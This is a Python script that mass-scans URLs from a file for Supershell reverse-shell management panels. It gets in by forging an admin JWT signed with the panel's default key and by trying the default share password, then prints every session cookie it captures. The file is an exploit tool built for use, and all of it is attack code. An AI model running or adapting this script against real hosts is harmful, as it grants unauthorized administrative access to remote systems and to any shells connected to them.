import re
import time

import jwt
import tqdm

import requestUtil
import urlUtil


def get_jwt_token(username, salt, exp_time):
    '''
        获取jwt token
    '''
    exp = int(time.time() + exp_time)
    data = {
      "username": username,
      "exp": exp
    }
    token = jwt.encode(payload=data, key=salt, algorithm='HS256')
    return token

def login(url, token):
    resp = requestUtil.get(url + "/supershell/client", cookies=f"token={token}", timeout=timeout, allow_redirects=False)
    return (resp and "备忘录" in resp.text)

def burp(url):
    for salt in ["Be sure to modify this key"]:
        username = "admin"
        token = get_jwt_token(username, salt, 999999)
        if login(url, token):
            print(f"[+] {url}/supershell/client [SALT] {salt} [COOKIE] token={token}")

def burp_share(url):
    for password in ["tdragon6"]:
        resp = requestUtil.post(url+"/supershell/share/shell/login/auth", header={"Content-Type": "application/json"}, data=f'{{"share_password":"{password}"}}', timeout=timeout)
        if resp and "Set-Cookie" in resp.headers:
            token = resp.headers["Set-Cookie"]
            print(f"[+] {url}/supershell/client [SHARE] {password} [COOKIE] {token}")
            # print(token)
            # print(login(url, token))


if __name__ == '__main__':
    timeout = 1
    urls = urlUtil.get_urls("url.txt")
    for url in tqdm.tqdm(urls):
        burp(url)